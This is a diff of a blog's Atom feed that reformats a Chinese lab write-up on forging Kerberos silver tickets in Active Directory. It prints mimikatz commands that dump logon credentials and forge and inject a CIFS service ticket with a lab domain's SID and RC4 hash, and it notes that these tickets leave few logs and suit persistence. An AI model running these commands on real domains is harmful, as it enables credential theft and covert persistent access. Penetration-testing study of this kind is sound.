@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://thekingofduck.github.io</id>
     <title>CoolCat&apos; Blog</title>
-    <updated>2020-03-05T05:55:58.133Z</updated>
+    <updated>2020-03-05T06:07:04.851Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://thekingofduck.github.io"/>
     <link rel="self" href="https://thekingofduck.github.io/atom.xml"/>
@@ -135,36 +135,26 @@
 <p>任意用户</p>
 <p>伪造过程：</p>
 <p>导出目标机器的hash：</p>
-<pre><code></code></pre>
 </li>
 </ul>
-<p>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;  &quot;exit&quot; &gt; hash.txt</p>
-<pre><code>
-![](https://thekingofduck.github.io/post-images/1583327211454.png)
-
+<pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;  &quot;exit&quot; &gt; hash.txt
 </code></pre>
-<p>mimikatz &quot;kerberos::golden /domain:adstudy.com /sid:S-1-5-21-290613818-3246529070-3099575750 /target:bot.adstudy.com /service:cifs /rc4:b0f256f8b3bca01555101864efef02ac /user:silver /ptt&quot; &quot;exit&quot;</p>
-<pre><code>![](https://thekingofduck.github.io/post-images/1583329253794.png)
-
-伪造成功后可使用klist查看票据,指令中伪造的服务是cifs，即Windows File Share（CIFS），在域内机器上测试的，本身就没限制，所以伪造了银票也没啥子用，就不截图了，如果伪造其他有权限限制机器上的服务即可越过限制。
-
-### 总结
-
-金票权限大，但是要过kdc，会留下日志。
-银票局限在特定服务内使用，不过kdc，只在域服务机器上留下日志。
-
-两者分别去读hash时都需要管理员权限，这是致命的缺陷，在攻击过程中就出现：
-
-&quot;有管理权限就可以直接读管理密码了，要金票银票何用？&quot;
-
-&gt; 可以用在权限维持上。
-
-参考文章：
-
-[域渗透-权限维持之 Silver Tickets](http://t3ngyu.leanote.com/post/Silver-Tickets)
-[域渗透-Ticket](https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Ticket.md)
-
+<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1583327211454.png" alt="" loading="lazy"></figure>
+<pre><code>mimikatz &quot;kerberos::golden /domain:adstudy.com /sid:S-1-5-21-290613818-3246529070-3099575750 /target:bot.adstudy.com /service:cifs /rc4:b0f256f8b3bca01555101864efef02ac /user:silver /ptt&quot; &quot;exit&quot;
 </code></pre>
+<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1583329253794.png" alt="" loading="lazy"></figure>
+<p>伪造成功后可使用klist查看票据,指令中伪造的服务是cifs，即Windows File Share（CIFS），在域内机器上测试的，本身就没限制，所以伪造了银票也没啥子用，就不截图了，如果伪造其他有权限限制机器上的服务即可越过限制。</p>
+<h3 id="总结">总结</h3>
+<p>金票权限大，但是要过kdc，会留下日志。<br>
+银票局限在特定服务内使用，不过kdc，只在域服务机器上留下日志。</p>
+<p>两者分别去读hash时都需要管理员权限，这是致命的缺陷，在攻击过程中就出现：</p>
+<p>&quot;有管理权限就可以直接读管理密码了，要金票银票何用？&quot;</p>
+<blockquote>
+<p>可以用在权限维持上。</p>
+</blockquote>
+<p>参考文章：</p>
+<p><a href="http://t3ngyu.leanote.com/post/Silver-Tickets">域渗透-权限维持之 Silver Tickets</a><br>
+<a href="https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Ticket.md">域渗透-Ticket</a></p>
 ]]></content>
     </entry>
     <entry>
